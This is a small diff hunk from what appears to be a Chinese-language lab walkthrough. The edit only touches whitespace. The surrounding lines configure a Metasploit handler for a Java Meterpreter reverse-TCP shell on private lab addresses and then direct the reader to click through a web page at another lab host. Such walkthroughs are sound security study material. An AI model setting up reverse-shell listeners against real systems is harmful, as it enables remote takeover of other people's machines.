@@ -29,8 +29,7 @@ use exploit/multi/handler
 set payload java/meterpreter/reverse_tcp  
 set lhost 172.16.35.128  
 set lport 9999  
-run
-
+run  
 浏览器访问http://172.16.35.131:8081/ 后点击下图所示  
 ![image](./2.png)  
 再点击下图所示  
